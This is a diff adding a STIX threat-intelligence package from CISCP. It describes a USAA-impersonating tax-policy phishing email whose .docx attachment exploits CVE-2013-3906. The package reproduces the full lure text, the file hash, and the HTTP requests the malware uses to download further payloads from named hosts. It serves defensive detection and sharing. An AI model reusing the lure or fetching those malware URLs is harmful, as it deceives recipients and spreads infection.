@@ -1,0 +1,221 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:EmailMessageObj="http://cybox.mitre.org/objects#EmailMessageObject-2" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:AddrObj="http://cybox.mitre.org/objects#AddressObject-2" xmlns:CISCP="http://www.us-cert.gov/ciscp" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="CISCP:IB-13-10759" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Tax Policy Themed Phishing Email Contains Attachment with Zero-Day Exploit</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
+    <stix:Description>On 13 November 2013, a phishing email with the subject line "Fwd: 2014 Individual Income Tax Credit Policy" was observed. The email had one (1) attachment which was a Microsoft Word (.docx) file crafted to exploit the CVE-2013-3906 zero-day vulnerability. After the exploitation, additional malware is downloaded.
+
+The data source is tracking this activity under the name Roxanne.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2013-11-14T20:20:52Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-afae6d89-3a96-43dc-9563-5889fe7e9d6b" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-2a980c12-ede8-4d11-86f3-eae687c8dd56"/>
+        <indicator:Indicator idref="CISCP:indicator-dcd0e669-c388-4f29-91c4-e6f2ede4616a"/>
+        <indicator:Indicator idref="CISCP:indicator-091638c0-c19d-4eb1-a93a-c0f1b308d515"/>
+        <indicator:Indicator idref="CISCP:indicator-cdf90994-c5f3-42aa-b5ce-6622d5e25824"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-2a980c12-ede8-4d11-86f3-eae687c8dd56" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malicious E-mail</indicator:Type>
+      <indicator:Description>This phishing email masquerades as a legitimate looking email forwarded by USAA, a US based financial institution. The attachment, 2014_Individual_Income_Tax_Credit_Policy.docx, exploits the vulnerability CVE-2013-3906.
+
+---BEGIN EMAIL HEADER---
+Headers Full:  
+Return-Path: &lt;don_whit12@aol.com&gt;
+Subject: Fwd: 2014 Individual Income Tax Credit Policy
+X-SENDER-IP: 64.12.81.146
+X-SENDER-REPUTATION: -0.4
+Received: from oms-md02.mx.aol.com ([64.12.81.146])
+    13 Nov 2013 14:33:04 +0000
+Received: from mtaomg-mb04.r1000.mx.aol.com (mtaomg-mb04.r1000.mx.aol.com
+    [172.29.41.75])
+    by oms-md02.mx.aol.com (AOL Outbound OMS Interface) with ESMTP id
+    B338538000139; Wed, 13 Nov 2013 09:33:03 -0500 (EST)
+Received: from core-mae003b.r1000.mail.aol.com (core-mae003.r1000.mail.aol.com
+    [172.29.28.137])
+    by mtaomg-mb04.r1000.mx.aol.com (OMAG/Core Interface) with ESMTP id
+    04087E00008B; Wed, 13 Nov 2013 09:33:03 -0500 (EST)
+References: &lt;8D0AE90E776AD95-A4B0-9C38@webmail-vd002.sysops.aol.com&gt;
+To: don_whit12@aol.com
+In-Reply-To: &lt;8D0AE90E776AD95-A4B0-9C38@webmail-vd002.sysops.aol.com&gt;
+X-MB-Message-Source: WebUI
+MIME-Version: 1.0
+From: Don Whit &lt;don_whit12@aol.com&gt;
+X-MB-Message-Type: User
+Content-Type: multipart/mixed; 
+    boundary="--------MB_8D0AE946386B855_A4B0_25C68_webmail-vd002.sysops.aol.com"
+X-Mailer: AOL Webmail 38190-BASIC
+Received: from 50.73.189.81 by webmail-vd002.sysops.aol.com (205.188.20.35)
+    with HTTP (WebMailUI); Wed, 13 Nov 2013 09:33:00 -0500
+Message-Id: &lt;8D0AE946386B855-A4B0-9F55@webmail-vd002.sysops.aol.com&gt;
+X-Originating-IP: [50.73.189.81]
+Date: Wed, 13 Nov 2013 09:33:00 -0500 (EST)
+x-aol-global-disposition: S
+X-SPAM-FLAG: YES
+X-AOL-VSS-INFO: 5600.1067/95068
+X-AOL-VSS-CODE: clean
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mx.aol.com;
+    s=20121107; t=1384353183;
+    bh=ipVRkOAxtqZS8whSycl7bcrbcmFJ++3kn1tqWqLzxKI=;
+    h=From:To:Subject:Message-Id:Date:MIME-Version:Content-Type;
+    b=WbOQU0jg4DKyY85CuNSUOwAXJFgsMsiln0BCM+p5Ucto6dn9BWu87RroYG9qam+9e
+    pRFsB1pB4ZV5OFHPZ/xtWU5A5g/xV8czl8v0O+dcHHFW7jRdMg9LAsxst1+fJ9CYTj
+    l2xX/h9P1DQr1AXNeSLgq3vj112o6OUu0Dh7+8gY=
+X-AOL-REROUTE: YES
+x-aol-sid: 3039ac1d294b52838d9f0b0f
+---END EMAIL HEADER---
+---BEGIN EMAIL BODY---
+Dear clients:
+Because we have changed our beneficiary policy for our clients to claim next year earned income tax credit, the IRS requires us to contact our existing carriers and review the contacts.
+Please check the attached latest edition of the 2014 Individual Income Tax Credit Policy and your insurance application forms.
+If you haven't decided to be our client, we still advise you to check the new policy for your benefit.
+We look forward to all future correspondence.
+Thank you
+ 
+Don Whit
+Case Manager
+210-531-USAA
+Don.Whit@usaa.com
+www.USAA.com
+
+-----Original Message-----
+From: USAA-support team &lt;support@usaa.com&gt;
+To: don_whit &lt;don_whit@usaa.com&gt;
+Sent: Wed, Nov 13, 2013 3:08 am
+Subject: 2014 Individual Income Tax Credit Policy
+FOR ALL CASE MANAGERS,
+ 
+DOWNLOAD THE LATEST 2014 INDIVIDUAL INCOME TAX CREDIT POLICY AND INFORM ALL YOUR VIP CLIENTS.
+ 
+USAA-SUPPORT TEAM
+---END EMAIL BODY---</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-5ede6403-da4a-4602-b4f3-51d03bd50228">
+        <cybox:Object id="CISCP:Object-be18a8a9-4df7-41e0-9a3f-f13cb1e9e541">
+          <cybox:Properties xsi:type="EmailMessageObj:EmailMessageObjectType">
+            <EmailMessageObj:Header>
+              <EmailMessageObj:From category="e-mail">
+                <AddrObj:Address_Value condition="Equals">don_whit12@aol.com</AddrObj:Address_Value>
+              </EmailMessageObj:From>
+              <EmailMessageObj:Subject condition="Equals">Fwd: 2014 Individual Income Tax Credit Policy</EmailMessageObj:Subject>
+              <EmailMessageObj:Message_ID condition="Equals">8D0AE946386B855-A4B0-9F55@webmail-vd002.sysops.aol.com</EmailMessageObj:Message_ID>
+              <EmailMessageObj:Sender category="e-mail">
+                <AddrObj:Address_Value condition="Equals">don_whit12@aol.com</AddrObj:Address_Value>
+              </EmailMessageObj:Sender>
+              <EmailMessageObj:X_Mailer condition="Equals">AOL Webmail 38190-BASIC</EmailMessageObj:X_Mailer>
+            </EmailMessageObj:Header>
+            <EmailMessageObj:Attachments>
+              <EmailMessageObj:File object_reference="CISCP:Object-e23a7f37-dae7-4322-bb67-8c65ee568383"/>
+            </EmailMessageObj:Attachments>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-11-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-dcd0e669-c388-4f29-91c4-e6f2ede4616a" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This .docx exploits CVE-2013-3906. Like other documents that exploit this vulnerability it is assumed that there is an embedded TIFF image. The malicious document downloads and launches additional malware.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-ec1d05ed-1873-4b46-a845-faefb103d8cf">
+        <cybox:Object id="CISCP:Object-e23a7f37-dae7-4322-bb67-8c65ee568383">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">2014_Individual_Income_Tax_Credit_Policy.docx</FileObj:File_Name>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">877c0a2f5ec6b3cf7aa6a0f290269248</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-11-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-091638c0-c19d-4eb1-a93a-c0f1b308d515" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This GET statement is created by the malicious .docx file to download additional malware.
+
+---BEGIN GET STATEMENT---
+GET /p/art.exe HTTP/1.1
+Accept: */*
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)
+Host: www.myspace-login.com
+Connection: Keep-Alive
+---END GET STATEMENT---</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-f1df11f6-7899-4e5d-8f9a-52492d4a80a2">
+        <cybox:Object id="CISCP:Object-3ebd349b-079e-4cc3-86a1-818a21da37c7">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://www.myspace-login.com/p/art.exe</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-11-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-cdf90994-c5f3-42aa-b5ce-6622d5e25824" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This GET statement is created by the previous executable file downloaded (art.exe) to download additional malware.
+
+---BEGIN GET REQUEST---
+GET /sb_new/editor/ HTTP/1.1
+Accept: image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/x-shockwave-flash, */*
+Accept-Language: en-us
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
+Accept-Encoding: gzip, deflate
+Host: www.artandpartners.com
+Connection: Keep-Alive
+Cache-Control: no-cache
+---END GET REQUEST---</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-89e1df88-e09c-474c-98af-23a6d8082249">
+        <cybox:Object id="CISCP:Object-b578cea0-15c6-48ae-b31c-06b0b0e50320">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://www.artandpartners.com/sb_new/editor/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-11-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
